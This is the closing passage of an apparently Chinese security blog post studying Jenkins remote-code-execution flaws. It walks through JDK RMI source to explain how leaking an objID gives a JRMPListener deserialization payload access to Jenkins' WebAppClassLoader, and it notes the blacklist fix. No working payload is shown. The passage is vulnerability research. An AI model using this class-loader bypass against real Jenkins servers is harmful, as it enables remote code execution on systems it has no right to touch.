&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ObjID var39;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var39 = ObjID.read(var1.getInputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var33) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, var33);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transport</span> <span class="variable">var40</span> <span class="operator">=</span> var39.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;</span><br><span class="line">        <span class="type">Target</span> <span class="variable">var5</span> <span class="operator">=</span> ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(var39, var40));</span><br><span class="line">        <span class="keyword">final</span> Remote var37;</span><br><span class="line">        <span class="keyword">if</span> (var5 != <span class="literal">null</span> &amp;&amp; (var37 = var5.getImpl()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getDispatcher();</span><br><span class="line">            var5.incrementCallCount();</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> var8;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                transportLog.log(Log.VERBOSE, <span class="string">&quot;call dispatcher&quot;</span>);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">AccessControlContext</span> <span class="variable">var7</span> <span class="operator">=</span> var5.getAccessControlContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">var41</span> <span class="operator">=</span> var5.getContextClassLoader();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">var9</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    setContextClassLoader(var41);</span><br><span class="line">                    currentTransport.set(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                                Transport.<span class="built_in">this</span>.checkAcceptPermission(var7);</span><br><span class="line">                                var6.dispatch(var37, var1);</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;, var7);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; </span><br><span class="line">                    ...</span><br><span class="line">                &#125; </span><br><span class="line">                ...</span><br><span class="line">            &#125; </span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里反序列化出 ObjID 后，会根据 ObjID 从 ObjectTable 取出 Target 对象，然后再从 Target 对象中取出 ClassLoader 并设置为当前环境下的 classLoader。</p>
<p>而调试可以得知，当使用默认的 objID 时，其 classLoader 为 AppClassLoader，其加载路径为启动命令、系统属性等 classpath，而 Jenkins 的 commons-collections 包是放在 lib 目录下的，也就是说要用 WebAppClassLoader 才能加载到，所以就会因为无法加载类而导致利用失败。</p>
<p>而在 JRMPListener payload 反序列化过程中，会调用 UnicastServerRef 类的 exportObject 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2, <span class="type">boolean</span> var3)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass();</span><br><span class="line"></span><br><span class="line">    Remote var5;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = Util.createProxy(var4, <span class="built_in">this</span>.getClientRef(), <span class="built_in">this</span>.forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;remote object implements illegal remote interface&quot;</span>, var7);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        <span class="built_in">this</span>.setSkeleton(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Target</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>(var1, <span class="built_in">this</span>, var5, <span class="built_in">this</span>.ref.getObjID(), var3);</span><br><span class="line">    <span class="built_in">this</span>.ref.exportObject(var6);</span><br><span class="line">    <span class="built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);</span><br><span class="line">    <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他会生成一个新的 Target，用自身 ref 属性（即 LiveRef）中的 objID 进行标识，并通过 putTarget 将其放入 ObjectTable 中。所以我们通过报错获取 LiveRef 中的 objID 后，就可以通过该 objID 在反序列化时获取相应 Target 中的 WebAppClassLoader。</p>
<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>将 rmi 相关的包放入黑名单。</p>
<hr>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/articles/web/242764.html">安全研究 | Jenkins漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/6361">Jenkins RCE漏洞分析汇总</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                    
                      <a class="hover-with-bg" href="/tags/Jenkins/">Jenkins</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2020/11/25/Jenkins%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/">
                        <i class="fa fa-chevron-left"></i>
                        <span>Jenkins相关漏洞学习（二）</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2020/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%A7%82%E6%B5%8B/">
                        <span>Tomcat源码观测</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "Jenkins相关漏洞学习（一）&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
